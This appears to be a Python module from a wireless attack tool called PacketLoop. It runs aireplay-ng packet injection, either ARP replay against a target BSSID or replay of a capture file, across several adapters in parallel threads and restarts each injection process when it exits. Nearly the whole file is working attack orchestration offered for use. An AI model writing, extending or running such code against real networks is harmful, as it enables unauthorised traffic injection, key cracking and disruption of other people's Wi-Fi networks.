import subprocess
import threading
import time
import os

# Feature 4: Multi-Interface Support
# Allows PacketLoop to orchestrate multiple wireless adapters simultaneously.
# Each interface operates independently, targeting a separate BSSID or channel.
# This enables parallel channel operations for large-scale environments.

class WeightedHopper:
    """
    Experimental Weighted Channel Hopping logic.
    Prioritizes channels with higher traffic volume.
    """
    def __init__(self, interface, weights=None):
        self.interface = interface
        self.weights = weights or {} # {channel: weight}
    
    def get_next_channel(self):
        # In a real implementation, this would use random.choices() based on weights.
        # For now, it returns the top-weighted channel.
        if not self.weights: return 1
        return max(self.weights, key=self.weights.get)

    def update_weight(self, channel, packet_count):
        self.weights[channel] = packet_count

class InterfaceWorker(threading.Thread):
    """A worker thread that manages packet injection on a single wireless interface."""

    def __init__(self, interface, bssid, whitelist=None, pcap=None, pps=500):
        super().__init__(daemon=True)
        self.interface = interface
        self.bssid = bssid
        self.whitelist = whitelist or []
        self.pcap = pcap
        self.pps = pps
        self._stop_event = threading.Event()
        self.process = None

    def log(self, msg):
        print(f"[{self.interface}] {msg}")

    def run(self):
        self.log(f"Worker started. Targeting BSSID: {self.bssid}")
        if self.pcap:
            cmd = [
                "aireplay-ng", "-2", "-r", self.pcap,
                "-x", str(self.pps), self.interface
            ]
        else:
            cmd = [
                "aireplay-ng", "-3", "-b", self.bssid,
                "-x", str(self.pps), self.interface
            ]

        self.process = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        while not self._stop_event.is_set():
            if self.process.poll() is not None:
                self.log("Process exited unexpectedly. Restarting...")
                self.process = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            time.sleep(2)

    def stop(self):
        self._stop_event.set()
        if self.process:
            self.process.terminate()
        self.log("Worker stopped.")


class MultiInterfaceManager:
    """Manages a pool of InterfaceWorker threads for parallel multi-adapter operations."""

    def __init__(self):
        self.workers = []

    def add_interface(self, interface, bssid, whitelist=None, pcap=None, pps=500):
        """Register a new interface with its targeting configuration."""
        worker = InterfaceWorker(interface, bssid, whitelist, pcap, pps)
        self.workers.append(worker)
        print(f"[MultiInterface] Registered interface: {interface} -> BSSID: {bssid}")

    def start_all(self):
        """Starts all registered interface workers in parallel."""
        if not self.workers:
            print("[MultiInterface] No interfaces registered.")
            return
        print(f"[MultiInterface] Launching {len(self.workers)} adapter(s)...")
        for worker in self.workers:
            worker.start()

    def stop_all(self):
        """Gracefully stops all interface workers."""
        print("[MultiInterface] Stopping all adapters...")
        for worker in self.workers:
            worker.stop()
        for worker in self.workers:
            worker.join(timeout=5)
        print("[MultiInterface] All adapters stopped.")

    @property
    def active_count(self):
        return sum(1 for w in self.workers if w.is_alive())
